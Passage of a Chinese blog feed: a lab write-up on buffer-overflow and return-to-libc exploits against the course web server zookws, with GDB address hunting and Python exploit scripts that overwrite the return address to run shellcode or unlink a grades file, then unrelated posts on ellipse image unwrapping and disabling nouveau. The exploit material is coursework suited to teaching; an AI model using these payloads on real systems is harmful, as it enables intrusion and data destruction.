<br>一旦你可以可靠地劫持程序的控制流，找到一个合适的地址，其中将包含你想要执行的代码，并专注于将正确的代码放在该地址——例如。 所提供的shell代码的派生。 <br><br></code></pre></td></tr></table></figure><h4 id="使用GDB寻找相应地址"><a href="#使用GDB寻找相应地址" class="headerlink" title="使用GDB寻找相应地址"></a>使用GDB寻找相应地址</h4><p>1.在<code>zookd.c:113</code>位置下一个断点，使用命令<code>b zookd.c:113</code>即可，随后c继续执行，运行到断点之后会自动停止，此时使用disas查看附近代码段的地址信息如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   0x0000555555556b14 &lt;+132&gt;:mov    %rax,%rdi<br>   0x0000555555556b17 &lt;+135&gt;:call   0x555555557efa &lt;env_deserialize&gt;<br>=&gt; 0x0000555555556b1c &lt;+140&gt;:mov    -0x1014(%rbp),%eax<br>   0x0000555555556b22 &lt;+146&gt;:mov    %eax,%edi<br>   0x0000555555556b24 &lt;+148&gt;:call   0x555555556f35 &lt;http_request_headers&gt;<br>   0x0000555555556b29 &lt;+153&gt;:mov    %rax,-0x8(%rbp)<br>   0x0000555555556b2d &lt;+157&gt;:cmpq   $0x0,-0x8(%rbp)<br>   0x0000555555556b32 &lt;+162&gt;:je     0x555555556b5b &lt;process_client+203&gt;<br><br></code></pre></td></tr></table></figure><p>我们可以看到我们需要利用的函数http_request_headers的返回地址为它的下一行的地址： 0x0000555555556b29。随后我们进入这个函数，在<code>http.c:173</code>下一个断点，继续执行到这个断点，我们再次打印附近的代码信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   0x0000555555557149 &lt;+532&gt;:call   0x555555556400 &lt;setenv@plt&gt;<br>   0x000055555555714e &lt;+537&gt;:jmp    0x555555556f5a &lt;http_request_headers+37&gt;<br>   0x0000555555557153 &lt;+542&gt;:nop<br>   0x0000555555557154 &lt;+543&gt;:mov    $0x0,%eax<br>   0x0000555555557159 &lt;+548&gt;:mov    -0x8(%rbp),%rbx<br>   0x000055555555715d &lt;+552&gt;:leave  <br>=&gt; 0x000055555555715e &lt;+553&gt;:ret <br></code></pre></td></tr></table></figure><p>此时已经执行到函数的返回，查看此时的rsp的地址，我们就可以看到在0x7fffffffdc88处存储的就是该函数的返回地址，那么我们就可以确定返回地址在栈上的位置为0x7fffffffdc88。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) p $rsp<br>$1 = (void *) 0x7fffffffdc88<br>(gdb) x/8x $rsp<br>0x7fffffffdc88:0x55556b290x000055550x000000020x00000006<br>0x7fffffffdc98:0x00216bc00x000000040x0021002f0x00000000<br></code></pre></td></tr></table></figure><p>那么我们现在只需要查看一下value数组所在的地址即可进行后面的构造，打印一下它的位置，为0x7fffffffda50，调试的准备工作就到此结束。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">(gdb) p &amp;value<br><span class="hljs-meta"><span class="hljs-keyword">$2</span> = (char (*)[512]) 0x7fffffffda50</span><br></code></pre></td></tr></table></figure><h4 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## You might find it useful to define variables that store various</span><br><span class="hljs-comment">## stack or function addresses from the zookd / zookfs processes,</span><br><span class="hljs-comment">## which you can then use in build_exploit(); the following are just</span><br><span class="hljs-comment">## examples.</span><br><br>stack_buffer = <span class="hljs-number">0x7fffffffda50</span><br>stack_retaddr = <span class="hljs-number">0x7fffffffdc88</span><br><br><span class="hljs-comment">## This is the function that you should modify to construct an</span><br><span class="hljs-comment">## HTTP request that will cause a buffer overflow in some part</span><br><span class="hljs-comment">## of the zookws web server and exploit it.</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    <span class="hljs-comment">## Things that you might find useful in constructing your exploit:</span><br>    <span class="hljs-comment">##</span><br>    <span class="hljs-comment">##   urllib.parse.quote_from_bytes(s).encode(&#x27;ascii&#x27;)</span><br>    <span class="hljs-comment">##     returns string s with &quot;special&quot; characters percent-encoded</span><br>    <span class="hljs-comment">##   struct.pack(&quot;&lt;Q&quot;, x)</span><br>    <span class="hljs-comment">##     returns the 8-byte binary encoding of the 64-bit integer x</span><br><br>    shellfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;shellcode.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <br>    shellcode = shellfile.read()<br><br>    req =   <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span> <br>    req += <span class="hljs-string">b&quot;EXP: &quot;</span><br>    req += shellcode + <span class="hljs-string">b&quot;A&quot;</span> * ((stack_retaddr - stack_buffer) - <span class="hljs-built_in">len</span>(shellcode))<br>    req += struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, stack_buffer)<br><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br><br></code></pre></td></tr></table></figure><p>这里的shellcode就是我们练习三中编译的用于删除txt文件的汇编代码。我们只需要把返回地址和注入数组之间的空余用一些无用的信息填充即可，这里我们用的是“A”，然后由于我们先向value填充的就是shellcode，因此最后将value这个数组的地址去替换原本的返回地址即可，当该函数返回时会指向shellcode的地址运行shellcode的代码。</p><p>最后运行一下make check-exstack，发现我们可以pass。</p><h2 id="三、Return-to-libc攻击"><a href="#三、Return-to-libc攻击" class="headerlink" title="三、Return-to-libc攻击"></a>三、Return-to-libc攻击</h2><p>许多现代操作系统将堆栈标记为不可执行，以使利用缓冲区溢出变得更加困难。 在本部分中，您将探索如何规避这种保护机制。 </p><p>前面的实验都是运行的可执行堆栈，后面就要使用<code>./clean-env.sh ./zookd-nxstack 8080</code>运行不可执行堆栈的版本了。</p><p>利用非可执行堆栈的缓冲区溢出的关键观察是，在ret指令跳到您放置在堆栈上的地址之后，您仍然控制程序计数器。 即使您不能跳转到溢出缓冲区的地址(它将不是可执行的)，在脆弱服务器的地址空间中通常有足够的代码来执行您想要的操作。 </p><p>因此，要绕过不可执行的堆栈，您需要首先找到想要执行的代码。 这通常是标准库中的一个名为libc的函数，例如execve、system或unlink。 然后，您需要安排堆栈和寄存器处于与使用所需参数调用该函数一致的状态。 最后，您需要安排ret指令跳转到您在第一步中找到的函数。 这种攻击通常被称为Return-to-libc攻击。 </p><h3 id="练习5"><a href="#练习5" class="headerlink" title="练习5"></a>练习5</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">构造一个在具有不可执行堆栈的二进制文件上运行时解除<span class="hljs-regexp">/home/</span>student/grades.txt链接的exploit。将这个新漏洞命名为exploit-<span class="hljs-number">5</span>.py。<br>在这种攻击中，您将通过网络控制服务器，而无需向服务器注入任何代码。 您应该使用<span class="hljs-keyword">return</span>-to-libc攻击，将控制流重定向到攻击之前已经存在的代码。 攻击的要点是执行缓冲区溢出: <br><span class="hljs-number">1</span>.使所选libc函数的参数位于堆栈上<br><span class="hljs-number">2</span>.然后意外地导致运行，使该参数以%rdi结束<br><span class="hljs-number">3</span>.然后意外地导致返回到所选的libc函数 <br></code></pre></td></tr></table></figure><p>思路大概就是我们要通过缓冲区溢出，使得返回地址跳转到unlink执行，并且合理的把参数放到%rdi上面去，因此我们可以利用实验中给出的提示信息，就是accidentally函数，去利用%rbp将%rdi的值置为参数字符串的地址。</p><p>首先我们看一下这个函数的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) disas accidentally<br>Dump of assembler code for function accidentally:<br>   0x0000555555556b8c &lt;+0&gt;:endbr64 <br>   0x0000555555556b90 &lt;+4&gt;:push   %rbp<br>   0x0000555555556b91 &lt;+5&gt;:mov    %rsp,%rbp<br>=&gt; 0x0000555555556b94 &lt;+8&gt;:mov    0x10(%rbp),%rdi<br>   0x0000555555556b98 &lt;+12&gt;:nop<br>   0x0000555555556b99 &lt;+13&gt;:pop    %rbp<br>   0x0000555555556b9a &lt;+14&gt;:ret    <br>End of assembler dump.<br><br></code></pre></td></tr></table></figure><p>可以看到这个函数把%rbp+16位置的值放入了%rdi，而这里的%rbp在前一行被%rsp的值所覆盖，所以其实要存放的目标地址就是栈顶指针%rsp+16的位置，由于%rsp是从http_request_headers里return来的，所以根据函数返回调用的栈帧运作情况我们可以推算出来这里的%rsp相当于http_request_headers中的%rbp+8（弹出了返回地址），那么accidentally中的%rsp+16就相当于http_request_headers中的%rbp+24了。因此我们只需要在http_request_headers中的%rbp+24位置放入参数字符串的地址即可，参数字符串放在%rbp+32</p><p>执行到http_request_headers最后一行下断点，我们可以如下打印出%rbp的值：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">(gdb) p <span class="hljs-symbol">$</span>rbp<br><span class="hljs-meta"><span class="hljs-keyword">$2</span> = (void *) 0x7fffffffdc80</span><br></code></pre></td></tr></table></figure><p>然后我们可以尝试打印出libc库中unlink函数的位置：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">(gdb) p unlink<br><span class="hljs-meta">$4</span> = &#123;&lt;<span class="hljs-type">text</span> variable, <span class="hljs-keyword">no</span> <span class="hljs-keyword">debug</span> <span class="hljs-keyword">info</span>&gt;&#125; <span class="hljs-number">0x1555554011c0</span> &lt;unlink&gt;<br></code></pre></td></tr></table></figure><p>因此我们就可以根据以上信息构造payload：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">------------------------------------------------------------------------------------------------------------</span><br><span class="hljs-code">......               |      ......       |</span><br><span class="hljs-code">0x7fffffffdca0       |  file path string |      &lt;- &quot;/home/student/grades.txt&quot;</span><br><span class="hljs-code">0x7fffffffdc98       |    string addr    |      &lt;- 0x7fffffffdca0 &amp; $rdi</span><br><span class="hljs-code">------------------------------------------------------------------------------------------------------------</span><br><span class="hljs-section">0x7fffffffdc90       |     ret addr      |      &lt;- addr of unlink()          stack frame of &quot;accidentally&quot;</span><br><span class="hljs-section">------------------------------------------------------------------------------------------------------------</span><br>0x7fffffffdc88       |     ret addr      |      &lt;- addr of accidentally()    stack frame of &quot;process_client&quot;<br>0x7fffffffdc80       |   preserved rbp   |      &lt;- 0x7fffffffdc90<br><span class="hljs-bullet">......               </span>|      ......       |<br>0x7fffffffda50       |   char[] value    |      &lt;- filled with char <span class="hljs-emphasis">&#x27;A&#x27;</span><br><span class="hljs-bullet">------------------------------------------------------------------------------------------------------- </span>%rsp<br><br></code></pre></td></tr></table></figure><p>核心代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">stack_buffer = <span class="hljs-number">0x7fffffffda50</span><br>stack_retaddr = <span class="hljs-number">0x7fffffffdc88</span><br>libc_retaddr = <span class="hljs-number">0x555555556b8c</span><br>unlink_addr = <span class="hljs-number">0x1555554011c0</span><br>filename_addr = <span class="hljs-number">0x7fffffffdca0</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">urlencode</span>(<span class="hljs-params">b</span>):<br>    r = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> b:<br>        r += <span class="hljs-string">b&quot;%&quot;</span>+c.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;little&quot;</span>).<span class="hljs-built_in">hex</span>().encode()<br>    <span class="hljs-keyword">return</span> r<br><span class="hljs-comment">## This is the function that you should modify to construct an</span><br><span class="hljs-comment">## HTTP request that will cause a buffer overflow in some part</span><br><span class="hljs-comment">## of the zookws web server and exploit it.</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    <span class="hljs-comment">## Things that you might find useful in constructing your exploit:</span><br>    <span class="hljs-comment">##</span><br>    <span class="hljs-comment">##   urllib.parse.quote_from_bytes(s).encode(&#x27;ascii&#x27;)</span><br>    <span class="hljs-comment">##     returns string s with &quot;special&quot; characters percent-encoded</span><br>    <span class="hljs-comment">##   struct.pack(&quot;&lt;Q&quot;, x)</span><br>    <span class="hljs-comment">##     returns the 8-byte binary encoding of the 64-bit integer x</span><br><br>    filename = <span class="hljs-string">b&quot;/home/student/grades.txt&quot;</span>+<span class="hljs-string">b&quot;\0&quot;</span><br><br>    req =   <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span> <span class="hljs-comment">#+ \</span><br>            <span class="hljs-comment">#b&quot;\r\n&quot;</span><br>    payload = <span class="hljs-string">b&quot;&quot;</span><br>    req += <span class="hljs-string">b&quot;EXP: &quot;</span><br>    req += <span class="hljs-string">b&quot;A&quot;</span> * ((stack_retaddr - stack_buffer)-<span class="hljs-number">8</span>) <span class="hljs-comment">#junk</span><br>    payload += struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x7fffffffdc90</span>)<br>    payload += struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, libc_retaddr) <span class="hljs-comment"># return adress</span><br>    payload += struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, unlink_addr)<br>    payload += struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, filename_addr)<br><br><br>    req += urlencode(payload)<br>    req += filename<br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>堆栈溢出</tag>
      
      <tag>GDB</tag>
      
      <tag>系统安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用Python和极坐标变换将椭圆环展开为矩形</title>
    <link href="/blog/2021/03/09/%E4%BD%BF%E7%94%A8Python%E5%92%8C%E6%9E%81%E5%9D%90%E6%A0%87%E5%8F%98%E6%8D%A2%E5%B0%86%E6%A4%AD%E5%9C%86%E7%8E%AF%E5%B1%95%E5%BC%80%E4%B8%BA%E7%9F%A9%E5%BD%A2/"/>
    <url>/blog/2021/03/09/%E4%BD%BF%E7%94%A8Python%E5%92%8C%E6%9E%81%E5%9D%90%E6%A0%87%E5%8F%98%E6%8D%A2%E5%B0%86%E6%A4%AD%E5%9C%86%E7%8E%AF%E5%B1%95%E5%BC%80%E4%B8%BA%E7%9F%A9%E5%BD%A2/</url>
    
    <content type="html"><![CDATA[<p><strong>最近的工作中遇到了一个问题，查了挺久发现没有相应的实现方式，于是自己摸索着写了一个椭圆环展开成为矩形长条的python算法，记录一下备忘。</strong></p><p><img src="/images/fj56.jpg"></p><span id="more"></span><h2 id="0x00代码"><a href="#0x00代码" class="headerlink" title="0x00代码"></a>0x00代码</h2><p>废话不多说先上代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> math<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_word_by_circle</span>(<span class="hljs-params">img,circle_center,radius,radius_width</span>):<br>    black_img = np.zeros((radius_width,<span class="hljs-built_in">int</span>(radius[<span class="hljs-number">1</span>]*(radius[<span class="hljs-number">0</span>]+radius[<span class="hljs-number">1</span>])/radius[<span class="hljs-number">0</span>])+<span class="hljs-number">500</span>,<span class="hljs-number">3</span>),dtype=<span class="hljs-string">&#x27;uint8&#x27;</span>)<br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,black_img.shape[<span class="hljs-number">0</span>]):<br>        <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,black_img.shape[<span class="hljs-number">1</span>]):<br>            theta = <span class="hljs-number">0</span>-(math.pi*<span class="hljs-number">2</span>/black_img.shape[<span class="hljs-number">1</span>]*(col+<span class="hljs-number">1</span>)+<span class="hljs-number">1.57</span>)<br>            <br>            rho = <span class="hljs-built_in">int</span>((radius[<span class="hljs-number">0</span>]*radius[<span class="hljs-number">1</span>])/(((radius[<span class="hljs-number">1</span>]**<span class="hljs-number">2</span>)*(math.cos(theta)**<span class="hljs-number">2</span>)+(radius[<span class="hljs-number">0</span>]**<span class="hljs-number">2</span>)*(math.sin(theta)**<span class="hljs-number">2</span>))**<span class="hljs-number">0.5</span>))-row-<span class="hljs-number">1</span><br>            <br>            p_x = <span class="hljs-built_in">int</span>(circle_center[<span class="hljs-number">0</span>] + rho*math.cos(theta))<br>            p_y = <span class="hljs-built_in">int</span>(circle_center[<span class="hljs-number">1</span>] - rho*math.sin(theta))<br>            <br>            black_img[row,col,:] = img[p_y,p_x,:]<br>            <br>    <span class="hljs-keyword">return</span> black_img<br><br></code></pre></td></tr></table></figure><p>参数解释：</p><ul><li>img是用cv2.imread读入的带有椭圆的图片；circle_center指的是椭圆圆心的坐标数据，是一个列表，相对于左上角[x,y]；radius是一个列表，[长轴半径，短轴半径]；radius_width指的是椭圆环的宽度</li></ul><p>最终生成的矩形长条，以椭圆环的外周长为长（实际上由于展开的是椭圆的印章，便于查看，增加了长），以椭圆环的宽度为高。函数中，从椭圆环的最外圈开始遍历，最外圈即对应着矩形中的第一行，宽度为多少，则矩形中就有多少行。以圆心为中心构成极坐标系，则圆环上任意一点可以用rho和theta来表示，再根据公式计算出该点在图上的真实坐标，把像素值赋给矩形框中对应的位置，极坐标转换公式如下所示：</p><p><img src="/images/jizuobiao.jpg"></p><h2 id="0x01效果"><a href="#0x01效果" class="headerlink" title="0x01效果"></a>0x01效果</h2><p>效果图如下：</p><p><img src="/images/tyyz.png"></p><p><img src="/images/tyyzzk.png"></p><p>由于椭圆的定位准确度不如圆，因此展开还有一些文字扭曲问题，效果还是没有很理想，后续还会继续优化。</p><h2 id="0x02补充"><a href="#0x02补充" class="headerlink" title="0x02补充"></a>0x02补充</h2><p>由于某些椭圆是倾斜的，因此我们需要引入一个新的参数去定义椭圆的倾斜角度inclination，单位是rad，具体实现方案参考：<a href="https://jingyan.baidu.com/article/2c8c281dfbf3dd0009252a7b.html">https://jingyan.baidu.com/article/2c8c281dfbf3dd0009252a7b.html</a></p><p>代码如下，增加了坐标变换：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> cv2<br><span class="hljs-attribute">import</span> numpy as np<br><span class="hljs-attribute">import</span> math<br><br><span class="hljs-attribute">def</span> get_word_by_circle(img,circle_center,radius,radius_width,inclination):<br>    <span class="hljs-attribute">black_img</span> = np.zeros((radius_width,int(radius[<span class="hljs-number">1</span>]*(radius[<span class="hljs-number">0</span>]+radius[<span class="hljs-number">1</span>])/radius[<span class="hljs-number">0</span>])+<span class="hljs-number">500</span>,<span class="hljs-number">3</span>),dtype=&#x27;uint8&#x27;)<br>    <span class="hljs-attribute">for</span> row in range(<span class="hljs-number">0</span>,black_img.shape[<span class="hljs-number">0</span>]):<br>        <span class="hljs-attribute">for</span> col in range(<span class="hljs-number">0</span>,black_img.shape[<span class="hljs-number">1</span>]):<br>            <span class="hljs-attribute">theta</span> = <span class="hljs-number">0</span>-(math.pi*<span class="hljs-number">2</span>/black_img.shape[<span class="hljs-number">1</span>]*(col+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>.<span class="hljs-number">57</span>-inclination)<br>            <br>            <span class="hljs-attribute">rho</span> = int((radius[<span class="hljs-number">0</span>]*radius[<span class="hljs-number">1</span>])/(((radius[<span class="hljs-number">1</span>]**<span class="hljs-number">2</span>)*(math.cos(theta)**<span class="hljs-number">2</span>)+(radius[<span class="hljs-number">0</span>]**<span class="hljs-number">2</span>)*(math.sin(theta)**<span class="hljs-number">2</span>))**<span class="hljs-number">0</span>.<span class="hljs-number">5</span>))-row-<span class="hljs-number">1</span><br>            <br>            <span class="hljs-attribute">p_x</span> = circle_center[<span class="hljs-number">0</span>] + rho*math.cos(theta)<br>            <span class="hljs-attribute">p_y</span> = circle_center[<span class="hljs-number">1</span>] - rho*math.sin(theta)<br><span class="hljs-comment">#坐标变换</span><br>            <span class="hljs-attribute">px</span> = int((p_x-circle_center[<span class="hljs-number">0</span>])*math.cos(inclination)-(p_y-circle_center[<span class="hljs-number">1</span>])*math.sin(inclination)+circle_center[<span class="hljs-number">0</span>])<br>            <span class="hljs-attribute">py</span> = int((p_x-circle_center[<span class="hljs-number">0</span>])*math.sin(inclination)+(p_y-circle_center[<span class="hljs-number">1</span>])*math.cos(inclination)+circle_center[<span class="hljs-number">1</span>])<br>            <br>            <span class="hljs-attribute">black_img</span>[row,col,:] = img[p_y,p_x,:]<br>            <br>    <span class="hljs-attribute">return</span> black_img<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>图像处理</tag>
      
      <tag>极坐标转换</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NVIDIA驱动安装之禁用nouveau</title>
    <link href="/blog/2021/01/05/NVIDIA%E9%A9%B1%E5%8A%A8%E5%AE%89%E8%A3%85%E4%B9%8B%E7%A6%81%E7%94%A8nouveau/"/>
    <url>/blog/2021/01/05/NVIDIA%E9%A9%B1%E5%8A%A8%E5%AE%89%E8%A3%85%E4%B9%8B%E7%A6%81%E7%94%A8nouveau/</url>
    
    <content type="html"><![CDATA[<p>最近实验室的服务器英伟达驱动重启之后就不能用了，查明原因原来是因为Ubuntu自动升级了内核，导致原本的驱动失效了，所以一定不要没事干去升级内核，下面介绍一下重装驱动的曲折之旅。</p><p><img src="/images/fj55.jpg"></p><span id="more"></span><h2 id="0x00更改blacklist（没成功）"><a href="#0x00更改blacklist（没成功）" class="headerlink" title="0x00更改blacklist（没成功）"></a>0x00更改blacklist（没成功）</h2><p>0.备份boot文件</p><p>1.更改conf文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nano /etc/modprobe.d/blacklist.conf<br><span class="hljs-comment">#尾部追加blacklist</span><br>  <span class="hljs-attribute">blacklist</span> nouveau<br>  <span class="hljs-attribute">options</span> nouveau modeset=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>2.重新生成 kernel initramfs:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo update-initramfs -u</span><br></code></pre></td></tr></table></figure><p>3.禁用图形化界面</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">$ <span class="hljs-string">sudo</span> <span class="hljs-string">systemctl</span> <span class="hljs-built_in">get-default</span><br><span class="hljs-string">graphical</span>.<span class="hljs-string">target</span><br>$ <span class="hljs-string">sudo</span> <span class="hljs-string">systemctl</span> <span class="hljs-built_in">set-default</span> <span class="hljs-string">multi-user</span>.<span class="hljs-string">target</span><br><span class="hljs-string">Created</span> <span class="hljs-string">symlink</span> /<span class="hljs-string">etc</span>/<span class="hljs-string">systemd</span>/<span class="hljs-string">system</span>/<span class="hljs-string">default</span>.<span class="hljs-string">target</span> → /<span class="hljs-string">lib</span>/<span class="hljs-string">systemd</span>/<span class="hljs-string">system</span>/<span class="hljs-string">multi-user</span>.<span class="hljs-string">target</span>.<br>$ <span class="hljs-string">sudo</span> <span class="hljs-string">systemctl</span> <span class="hljs-built_in">get-default</span><br><span class="hljs-string">multi-user</span>.<span class="hljs-string">target</span><br></code></pre></td></tr></table></figure><p>4.重启，然后 lsmod  | grep nouveau ，还是有该模块。</p><h2 id="0x01移除nouveau-ko（没成功）"><a href="#0x01移除nouveau-ko（没成功）" class="headerlink" title="0x01移除nouveau.ko（没成功）"></a>0x01移除nouveau.ko（没成功）</h2><p>1.打开&#x2F;lib&#x2F;modules&#x2F;目录</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo <span class="hljs-built_in">find</span> -name ‘nouveau*’<br></code></pre></td></tr></table></figure><p>2.然后将查找到的ko文件重命名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo mv .<span class="hljs-regexp">/4.15.0-117-generic/</span>kernel<span class="hljs-regexp">/drivers/g</span>pu<span class="hljs-regexp">/drm/</span>nouveau<span class="hljs-regexp">/nouveau.ko ./</span><span class="hljs-number">4.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">117</span>-generic<span class="hljs-regexp">/kernel/</span>drivers<span class="hljs-regexp">/gpu/</span>drm<span class="hljs-regexp">/nouveau/</span>nouveau.ko.bkp<br><br>sudo mv .<span class="hljs-regexp">/4.15.0-128-generic/</span>kernel<span class="hljs-regexp">/drivers/g</span>pu<span class="hljs-regexp">/drm/</span>nouveau<span class="hljs-regexp">/nouveau.ko ./</span><span class="hljs-number">4.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">128</span>-generic<span class="hljs-regexp">/kernel/</span>drivers<span class="hljs-regexp">/gpu/</span>drm<span class="hljs-regexp">/nouveau/</span>nouveau.ko.bkp<br><br></code></pre></td></tr></table></figure><p>3.重新生成 